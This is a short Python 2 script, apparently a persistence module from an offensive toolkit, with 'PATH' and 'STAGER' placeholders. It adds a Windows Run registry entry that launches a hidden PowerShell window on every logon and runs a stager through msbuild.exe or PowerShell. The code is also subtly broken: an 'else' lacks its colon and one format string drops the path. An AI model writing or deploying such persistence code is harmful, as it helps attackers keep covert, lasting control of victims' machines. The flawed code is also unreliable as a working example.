import _winreg as winreg

def write_key():
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)
    _path = "PATH"
    _stager = 'STAGER'
    if _stager=='msbuild':
        command = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\msbuild.exe {}".format(_path)
    elif _stager=='powershell':
        command = ".\\".format(_path)
    elif _stager=='wmic':
        #command =  "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe os get /format:\"{}\"".format(_path)
        return 'Not implemented yet'
    else
        return 'Unknown stager'
    value = r'powershell.exe -WindowStyle hidden -NoExit -Command {}'.format(command)
    with reg_key:
        winreg.SetValueEx(reg_key, 'ST', 0, winreg.REG_SZ, value)
    return 'Registry key set'
        
print(write_key())
